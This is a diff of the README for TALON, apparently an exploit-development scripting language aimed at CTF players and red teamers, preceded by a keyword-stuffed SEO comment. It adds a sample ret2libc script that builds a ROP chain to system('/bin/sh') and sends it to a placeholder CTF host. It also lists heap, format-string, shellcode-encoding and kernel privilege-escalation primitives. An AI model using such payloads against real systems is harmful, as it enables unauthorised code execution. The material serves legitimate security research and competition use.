@@ -6,15 +6,20 @@ kernel exploit prototyping, smart contract auditing language
 -->
 <!-- TALON scripting language, TALON DSL, offensive security scripting language, exploit development language, exploit centric DSL, security native programming language, hacking DSL, red team scripting language, CTF scripting language, exploit automation language, binary exploitation DSL, pwn scripting language, reverse engineering DSL, exploit compiler, exploit interpreter, domain specific language for hacking, English like exploit language, human readable exploit scripting, native exploit compilation, Rust LLVM exploit compiler, LLVM based exploit language, native code exploit generation, shellcode generation language, ROP scripting language, return oriented programming DSL, heap exploitation language, kernel exploitation scripting, Windows exploitation DSL, Linux exploitation DSL, format string exploitation language, automatic offset discovery, GDB assisted exploitation, libc database integration, libc.rip integration, exploit template engine, interactive exploit helpers, quick exploit prototyping, CTF automation tooling, red team lab tooling, adversarial research language, security research DSL, exploit research platform, binary analysis tooling, ELF analysis, PE analysis, Mach-O analysis, integrated disassembler helpers, fuzzing language, binary fuzzing DSL, kernel fuzzing research, exploit fuzzing automation, vulnerability research language, exploit chain modeling, post exploitation scripting, lateral movement research tooling, privilege escalation research, kernel CVE exploitation framework, exploit proof of concept language, exploit PoC automation, exploit scaffolding language, modular standard library, security focused standard library, plugin based exploit framework, extensible exploit language, native Rust plugin system, dynamic module loading, exploit module framework, IDE assisted exploitation, VS Code exploit extension, exploit debugger integration, visual exploit tooling, interactive REPL exploitation, exploit REPL environment, command line exploit tooling, cross platform exploit language, Windows Linux exploit tooling, offensive security compiler, red team engineering toolkit, exploit engineering platform, CTF competition tooling, alpha stage exploit language, experimental exploit DSL, research only offensive tooling, ethical security research language -->
 
-# TALON - Scripting Language for Offensive Security
+# TALON - Rust-Native Exploit Development DSL
 <img src="talon.png" alt="Talon scripting language logo" width="50%">
 
 
-TALON is a security native, exploit centric, English like domain specific language designed for exploit developers, CTF competitors, red teamers, reverse engineers, and security researchers.
+TALON is a domain-specific language for exploit development and binary analysis, featuring Rust-native compilation, LLVM-backed code generation, and an ergonomic exploitation API.
 
-This repository contains the TALON compiler, interpreter, standard library, exploit tooling, plugin system, and IDE integrations.
+**Core Architecture:**
+- Rust-based interpreter with async I/O primitives
+- Native binary analysis (ELF/PE/Mach-O parsing via object crate)
+- Stateful ROP chain builder with semantic gadget search
+- Integrated libc database with automatic offset resolution
+- Real interactive shell bridging (stdin/stdout multiplexing)
 
-> **ALPHA NOTICE**: TALON is under **active development**. Expect breaking changes, experimental syntax, and rapid iteration. Not yet production-safe. Ideal for CTF competitions, red team labs, research, or prototyping offensive techniques.
+> **ALPHA NOTICE**: TALON is under **active development**. Core functionality is tested (88/88 unit tests, 28/28 doc tests). Breaking changes expected. Ideal for CTF competitions, exploit research, and offensive technique prototyping.
 
 
 [![codecov](https://codecov.io/gh/ridpath/talon/branch/main/graph/badge.svg)](https://codecov.io/gh/ridpath/talon)
@@ -24,16 +29,22 @@ This repository contains the TALON compiler, interpreter, standard library, expl
 
 ## Key Capabilities
 
-- Human-readable exploit DSL
-- Native compilation via Rust/LLVM
-- Built-in exploitation primitives (ROP, heap, kernel, format strings)
-- Libc database integration (libc.rip)
-- Automatic buffer overflow offset discovery (GDB)
-- Exploit templates and interactive quick helpers
-- Integrated binary analysis (ELF, PE, Mach-O)
-- Modular standard library (138+ modules)
-- Plugin system (TALON modules + native Rust plugins)
-- VS Code IDE extension with debugger and visual tools
+**Verified Core Features:**
+- **Map-based object system**: `elf.symbols["main"]`, `elf.plt["puts"]`, `elf.got["libc"]`
+- **Stateful ROP builder**: Object-oriented gadget search with `ROP(elf)` and `find(rop, "pop rdi")`
+- **Libc database integration**: 4 pre-loaded versions (Ubuntu 18.04/20.04/22.04, Debian 10) with automatic offset calculation
+- **Real interactive I/O**: Bidirectional stdin/stdout bridge with connection registry
+- **Cyclic pattern generation**: De Bruijn sequences for offset discovery (`cyclic()`, `cyclic_find()`)
+- **Native binary parsing**: ELF analysis via `Elf()` with PLT/GOT/symbol extraction
+- **Pack/unpack primitives**: `p64()`, `p32()`, `u64()`, `u32()` for exploit payloads
+
+**Additional Features:**
+- Heap exploitation primitives (tcache poisoning, fastbin attack, House of *)
+- Format string exploitation with automatic offset discovery
+- Shellcode generation and encoding (badchar bypass, polymorphic encoding)
+- Kernel exploit primitives (cred overwrite, modprobe_path, stack pivot)
+- Network I/O with connection management (`connect`, `send`, `recv`, `recvline`, `recvuntil`)
+- Plugin system (TALON modules + native Rust FFI)
 
 ---
 
@@ -163,11 +174,53 @@ talon template <name> <args>
 
 ---
 
-## Interactive Helpers
+## Power User API
+
+### Object-Oriented Exploitation
 
 ```talon
-quick_shell("host", port)
-quick_rop("./binary")
+# Binary analysis with map-based object system
+let elf = Elf("./vuln")
+let main = elf["symbols"]["main"]
+let puts_plt = elf["plt"]["puts"]
+let libc_got = elf["got"]["__libc_start_main"]
+
+print("[*] Binary base:", hex(elf["base_addr"]))
+print("[*] PIE:", elf["pie"], "| NX:", elf["nx"], "| Canary:", elf["canary"])
+
+# Libc database with automatic offset resolution
+let libc = Libc("ubuntu20.04")
+let system_offset = libc["symbols"]["system"]
+let binsh_offset = libc["symbols"]["bin_sh"]
+let one_gadgets = libc["one_gadgets"]
+
+# Calculate absolute addresses from leaked base
+let libc_base = leaked_addr - 0x21b10
+let libc_resolved = Libc({version: "ubuntu20.04", base: libc_base})
+let system_addr = libc_resolved["symbols"]["system"]
+
+# Stateful ROP chain builder
+let rop = ROP(elf)
+let pop_rdi = find(rop, "pop rdi; ret")
+let pop_rsi = find(rop, "pop rsi")
+let ret = find(rop, "ret")
+
+print("[*] Found", rop["gadget_count"], "gadgets")
+
+# Build exploit payload
+let payload = cyclic(264) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
+
+# Network I/O with connection registry
+let conn = connect("pwn.chal.ctf", 1337)
+send(conn, payload)
+let response = recvuntil(conn, "> ")
+interactive(conn)
+```
+
+### Quick Helpers
+
+```talon
+quick_rop("./binary")         # Returns ROP object with all gadgets
 quick_pwn("./binary", "host", port)
 quick_heap()
 quick_fmt()
@@ -201,7 +254,7 @@ See `README.md in vscode-extensions directory` for IDE features, debugging, and 
 
 ## Testing & Quality Assurance
 
-TALON maintains **world-class quality** through comprehensive testing infrastructure covering unit tests, integration tests, fuzzing, benchmarking, and continuous integration.
+TALON maintains comprehensive testing infrastructure covering unit tests, integration tests, fuzzing, benchmarking, and continuous integration.
 
 ### Quick Test Commands
 
@@ -225,19 +278,26 @@ cargo test format_string              # Format string tests
 
 ### Test Organization
 
-**Unit Tests** (`tests/unit/`):
-- Parser and AST (`parser_test.rs`, `ast_test.rs`)
-- Binary analysis (`binary_analysis_test.rs`)
-- Exploitation modules (`rop_test.rs`, `heap_test.rs`, `shellcode_test.rs`)
-- Packing/encoding (`packing_test.rs`, `encoding_test.rs`, `cyclic_test.rs`)
-- Format strings (`format_string_test.rs`)
-- LSP server (`lsp_test.rs`)
+**Unit Tests** (`src/` - 88 tests, 100% passing):
+- Parser and AST validation
+- Binary analysis (ELF/PE/Mach-O)
+- ROP gadget finder
+- Heap exploitation primitives
+- Shellcode generation and encoding
+- Packing/unpacking primitives
+- Cyclic pattern generation
+- Format string exploitation
 
-**Integration Tests** (`tests/integration/`):
-- Standard library coverage (`stdlib/` - 163 tests across 12 categories)
-- Multi-stage exploit chains (`exploit_chain_test.rs` - 30 comprehensive scenarios)
-- LSP/IDE integration (`lsp_integration_test.rs` - 110+ protocol tests)
-- Example script validation (`example_runner_test.rs`)
+**Doc Tests** (`src/` - 28 tests, 100% passing):
+- API documentation examples
+- Inline code samples
+- Usage patterns
+
+**Integration Tests** (`tests/integration/` - 582/719 passing):
+- Standard library coverage (163 stdlib tests)
+- Multi-stage exploit chains (30 scenarios)
+- LSP/IDE integration (110+ protocol tests)
+- Example script validation
 
 ### Code Coverage
 
@@ -308,11 +368,11 @@ cargo bench binary_analysis            # Binary analysis benchmarks
 .\scripts\run_benchmarks.ps1           # Windows
 ```
 
-**Benchmark Suites** (91 benchmark functions):
-- Parser (24 benchmarks) - Expression parsing, statement parsing, error recovery
-- Interpreter (25 benchmarks) - Variables, control flow, functions, exploitation
-- Binary analysis (24 benchmarks) - ELF parsing, disassembly, patching
-- ROP tools (18 benchmarks) - Gadget search, chain building, auto solver
+**Benchmark Suites**:
+- Parser benchmarks - Expression parsing, statement parsing, error recovery
+- Interpreter benchmarks - Variables, control flow, functions, exploitation primitives
+- Binary analysis benchmarks - ELF parsing, disassembly, binary patching
+- ROP tools benchmarks - Gadget search, chain building, semantic solver
 
 See **`docs/BENCHMARKING.md`** for performance analysis and optimization guidelines.
 
